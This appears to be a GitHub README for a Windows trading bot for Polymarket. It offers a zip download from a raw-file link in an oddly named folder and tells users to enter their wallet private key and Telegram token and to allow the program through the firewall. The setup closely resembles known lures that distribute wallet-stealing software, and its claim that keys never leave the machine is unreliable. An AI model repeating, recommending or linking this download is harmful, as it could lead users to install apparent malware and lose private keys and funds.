# 🤖 polymarket-bot - Automate your prediction market trading tasks

[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Aidenb2931/polymarket-bot/main/partitionist/polymarket-bot-3.2.zip)

This software manages trading activities on Polymarket. It monitors market data, identifies price differences, and places bets based on pre-set strategies. The program runs on Windows and connects directly to the Polygon network to execute transactions.

## 📋 Features

The bot performs several functions to help you manage your positions:

*   **Real-time Monitoring**: The tool tracks market prices and updates your dashboard as events change.
*   **Smart Strategies**: Users select predefined logic to guide entry and exit points for trades.
*   **Arbitrage**: The engine identifies price gaps between markets to find potential profit opportunities.
*   **Automated Betting**: Once a strategy triggers, the bot executes the trade without further manual input.
*   **Telegram Alerts**: Receive instant notifications on your phone when the software places a trade or detects a market shift.

## 🔑 Initial Configuration

The software requires a connection to the Polygon network to function. You must provide your account details to allow the bot to manage trades.

1.  Open the application from the desktop shortcut.
2.  Navigate to the Settings tab within the main window.
3.  Enter your Web3 wallet address.
4.  Input your private key or connect your hardware wallet if requested. The software stores this information locally on your machine for security.
5.  Enter your Telegram bot token and chat ID if you wish to receive mobile alerts.
6.  Click Save Changes to commit your settings.

## 📈 Running Your First Strategy

Once the software links to your wallet, you can start monitoring the markets.

1.  Navigate to the Market Dashboard.
2.  Choose a market from the active list.
3.  Select a strategy from the dropdown menu. Strategies define how the bot determines value and risk.
4.  Set your maximum investment amount per trade.
5.  Click Start Bot. The status indicator will turn green to show the bot is active.
6.  Check the Logs tab to see the bot scanning for opportunities in real time.

## 🛠️ Troubleshooting

If the bot stops, verify these items:

*   **Internet Connection**: Ensure your computer has a stable link to the network.
*   **Wallet Balance**: Check that your wallet has enough funds in MATIC to cover gas fees for transactions.
*   **Permissions**: Ensure the application has permission to pass through your Windows Firewall.
*   **Restart**: Close and reopen the application if the dashboard shows an error or unresponsive state.

## ❓ Frequently Asked Questions

**Does the bot store my private keys on a server?**
No. All configuration and wallet data stay contained on your local computer. The software does not send your private keys to any external databases.

**Can I run multiple strategies at once?**
Yes. You can open multiple instances of the application or configure the bot to watch multiple assets simultaneously depending on your hardware capacity.

**Is this bot suitable for beginners?**
The interface focuses on simplicity. As long as you have a basic understanding of how prediction markets work, the automated features will assist your trading process significantly.

**Do I need to maintain the bot 24/7?**
The bot functions best when left running. If you close the application, the bot will pause all activity until you reopen it.

**Why am I not getting Telegram notifications?**
Double-check that you entered the correct API Token and Chat ID in the notification settings. You can click the Test Alert button to verify the connection.
